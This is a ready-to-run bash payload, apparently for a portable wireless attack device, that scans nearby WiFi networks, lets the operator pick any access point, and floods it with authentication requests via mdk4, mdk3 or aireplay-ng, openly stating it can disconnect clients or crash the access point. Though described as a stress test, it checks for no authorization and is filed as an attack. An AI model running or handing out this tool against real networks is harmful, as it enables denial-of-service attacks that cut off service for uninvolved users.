#!/bin/bash
# Title: Auth Flood
# Author: bad-antics
# Description: Authentication flood to stress test APs
# Category: nullsec/attack

PROMPT "AUTH FLOOD

Flood target AP with
authentication requests.

Can cause AP to:
- Slow down
- Disconnect clients
- Crash/reboot

Press OK to configure."

[ ! -d "/sys/class/net/wlan0" ] && { ERROR_DIALOG "wlan0 not found!"; exit 1; }

PROMPT "SELECT TARGET:

1. Scan and select
2. Enter BSSID manually

Enter option next."

MODE=$(NUMBER_PICKER "Mode (1-2):" 1)

if [ "$MODE" -eq 1 ]; then
    SPINNER_START "Scanning..."
    timeout 10 airodump-ng wlan0 --write-interval 1 -w /tmp/authscan --output-format csv 2>/dev/null
    SPINNER_STOP
    
    NET_COUNT=$(grep -c "WPA\|WEP\|OPN" /tmp/authscan*.csv 2>/dev/null || echo 0)
    PROMPT "Found $NET_COUNT networks"
    
    TARGET_NUM=$(NUMBER_PICKER "Target #:" 1)
    
    TARGET_LINE=$(grep "WPA\|WEP\|OPN" /tmp/authscan*.csv 2>/dev/null | sed -n "${TARGET_NUM}p")
    BSSID=$(echo "$TARGET_LINE" | cut -d',' -f1 | tr -d ' ')
    CHANNEL=$(echo "$TARGET_LINE" | cut -d',' -f4 | tr -d ' ')
    SSID=$(echo "$TARGET_LINE" | cut -d',' -f14 | tr -d ' ')
else
    BSSID=$(MAC_PICKER "Target BSSID:")
    CHANNEL=$(NUMBER_PICKER "Channel:" 6)
    SSID="target"
fi

DURATION=$(NUMBER_PICKER "Duration (sec):" 30)
case $? in $DUCKYSCRIPT_CANCELLED|$DUCKYSCRIPT_REJECTED) DURATION=30 ;; esac

resp=$(CONFIRMATION_DIALOG "LAUNCH FLOOD?

Target: $SSID
BSSID: $BSSID
Duration: ${DURATION}s

Press OK to attack.")
[ "$resp" != "$DUCKYSCRIPT_USER_CONFIRMED" ] && exit 0

iwconfig wlan0 channel $CHANNEL

LOG "Flooding $SSID..."

if command -v mdk4 >/dev/null 2>&1; then
    timeout $DURATION mdk4 wlan0 a -a "$BSSID" &
elif command -v mdk3 >/dev/null 2>&1; then
    timeout $DURATION mdk3 wlan0 a -a "$BSSID" &
else
    # Fallback to fake auth
    timeout $DURATION aireplay-ng -1 0 -e "$SSID" -a "$BSSID" -h $(cat /sys/class/net/wlan0/address) wlan0 &
fi

FLOOD_PID=$!

PROMPT "AUTH FLOOD ACTIVE

Target: $SSID

Press OK to STOP."

kill $FLOOD_PID 2>/dev/null
killall mdk4 mdk3 aireplay-ng 2>/dev/null

PROMPT "FLOOD STOPPED

Target: $SSID
Press OK to exit."
